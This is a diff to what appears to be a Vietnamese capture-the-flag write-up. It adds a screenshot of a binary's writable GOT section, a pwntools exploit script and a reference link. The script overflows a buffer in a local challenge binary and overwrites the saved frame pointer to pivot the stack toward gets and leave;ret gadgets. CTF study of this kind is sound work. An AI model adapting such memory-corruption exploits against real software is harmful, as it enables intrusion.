@@ -76,4 +76,49 @@ $7 = 0x40
 
 <img width="660" height="358" alt="image" src="https://github.com/user-attachments/assets/21cc8d38-5a2c-43f1-8897-e8724a324783" />
 
+* got, writable section:
+<img width="662" height="406" alt="image" src="https://github.com/user-attachments/assets/f0e16032-73ea-4c2a-b45c-5c8f5c0b9d78" />
 
+* ``script.py``:
+````python
+from pwn import *
+
+context.binary = exe = ELF("./chall")
+
+context.log_level = "debug"
+
+p = process(exe.path)
+
+gdb.attach(p, gdbscript='''
+	br *main
+	br *main+175
+	''')
+
+p.sendline(b"1")
+
+gets = 0x40125f
+leave_ret = 0x4011ba
+write_sec = 0x404000
+high_write_sec = 0x404800
+
+payload = b"A" * 64
+payload += p64(high_write_sec)
+
+p.recvuntil(b"Enter world name:")
+p.recvline()
+p.sendline(payload)
+
+payload = b"A" * 64
+
+p.recvuntil(b"Creative")
+p.recvline()
+p.sendline(b"2")
+
+p.interactive()
+````
+
+
+____
+Tai lieu:
+
+https://sashactf.gitbook.io/pwn-notes/ctf-writeups/htb-business-2024/no-gadgets
